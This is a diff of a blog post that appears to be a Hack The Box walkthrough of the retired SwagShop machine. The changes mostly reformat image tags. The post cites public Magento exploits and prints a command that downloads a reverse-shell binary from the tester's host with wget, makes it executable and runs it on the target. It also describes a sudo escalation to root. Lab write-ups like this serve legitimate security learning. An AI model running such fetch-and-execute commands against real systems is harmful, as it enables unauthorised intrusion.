@@ -17,10 +17,10 @@ This post documents the complete walkthrough of SwagShop, a retired vulnerable [
 
 <!--more-->
 
-## On this post 
-{:.no_toc} 
+## On this post
+{:.no_toc}
 
-* TOC 
+* TOC
 {:toc}
 
 ## Background
@@ -61,9 +61,9 @@ PORT   STATE SERVICE REASON         VERSION
 
 The `http` service appears to be running an old version of Magento Community Edition (2014? Hello, it's 2019!). Sometimes it pays to look at the copyright notice down at the footer. Here's how it looks like.
 
-<a class="image-popup">
-![d34cc2c8.png](/assets/images/posts/swagshop-htb-walkthrough/d34cc2c8.png)
-</a>
+
+{% include image.html image_alt="d34cc2c8.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/d34cc2c8.png" %}
+
 
 Scroll down.
 
@@ -71,9 +71,9 @@ Scroll down.
 
 How do I know the version? Check out the release notes basically. The directory structure is also found in a GitHub repository [mirror](https://github.com/OpenMage/magento-mirror/tree/1.7.0.2) for older versions.
 
-<a class="image-popup">
-![a09563a1.png](/assets/images/posts/swagshop-htb-walkthrough/a09563a1.png)
-</a>
+
+{% include image.html image_alt="a09563a1.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/a09563a1.png" %}
+
 
 ### Magento Shoplift Vulnerability
 
@@ -85,15 +85,15 @@ Well, there's a readily available exploit, EDB-ID [37977](https://www.exploit-db
 
 This next exploit, EDB-ID [37811](https://www.exploit-db.com/exploits/37811) will allow us to execute remote commands. There are just two minor modifications to the exploit script.
 
-<a class="image-popup">
-![701cf120.png](/assets/images/posts/swagshop-htb-walkthrough/701cf120.png)
-</a>
+
+{% include image.html image_alt="701cf120.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/701cf120.png" %}
+
 
 We got the credentials from the previous exploit. The installation date can be obtained from `http://10.10.10.140/app/etc/local.xml` as suggested.
 
-<a class="image-popup">
-![4bfdeefa.png](/assets/images/posts/swagshop-htb-walkthrough/4bfdeefa.png)
-</a>
+
+{% include image.html image_alt="4bfdeefa.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/4bfdeefa.png" %}
+
 
 One last thing we need to know is the URL to the Admin Panel, which is `http://10.10.10.140/index.php/admin`. You can get a feel of the directory structure by navigating the site a bit, provided it doesn't give you `503`s :laugh:
 
@@ -105,47 +105,47 @@ I generate a reverse shell with `msfvenom`, host it with Python's SimpleHTTPServ
 # python rce.py http://10.10.10.140/index.php/admin "wget -O/tmp/rev http://10.10.14.11/rev; chmod +x /tmp/rev; /tmp/rev"
 ```
 
-<a class="image-popup">
-![2654aa89.png](/assets/images/posts/swagshop-htb-walkthrough/2654aa89.png)
-</a>
+
+{% include image.html image_alt="2654aa89.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/2654aa89.png" %}
+
 
 It's customary to display `/etc/passwd`.
 
-<a class="image-popup">
-![a7d45ff6.png](/assets/images/posts/swagshop-htb-walkthrough/a7d45ff6.png)
-</a>
+
+{% include image.html image_alt="a7d45ff6.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/a7d45ff6.png" %}
+
 
 The file `user.txt` is in `haris`'s home directory and it can be disappointingly read by all.
 
-<a class="image-popup">
-![b11e7841.png](/assets/images/posts/swagshop-htb-walkthrough/b11e7841.png)
-</a>
+
+{% include image.html image_alt="b11e7841.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/b11e7841.png" %}
+
 
 ## Privilege Escalation
 
 Notice the `.sudo_as_admin_successful`?
 
-<a class="image-popup">
-![1859737a.png](/assets/images/posts/swagshop-htb-walkthrough/1859737a.png)
-</a>
+
+{% include image.html image_alt="1859737a.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/1859737a.png" %}
+
 
 This means that `haris` is able to `sudo` to a certain extent.
 
-<a class="image-popup">
-![4aaf3f8b.png](/assets/images/posts/swagshop-htb-walkthrough/4aaf3f8b.png)
-</a>
+
+{% include image.html image_alt="4aaf3f8b.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/4aaf3f8b.png" %}
+
 
 There you go, classic escape to `root` shell.
 
-<a class="image-popup">
-![6d2c05ad.png](/assets/images/posts/swagshop-htb-walkthrough/6d2c05ad.png)
-</a>
+
+{% include image.html image_alt="6d2c05ad.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/6d2c05ad.png" %}
+
 
 With that, getting `root.txt` is a breeze.
 
-<a class="image-popup">
-![87726194.png](/assets/images/posts/swagshop-htb-walkthrough/87726194.png)
-</a>
+
+{% include image.html image_alt="87726194.png" image_src="/80556ac2-38bb-4e97-84b1-a0143436377b/87726194.png" %}
+
 
 :dancer:
 
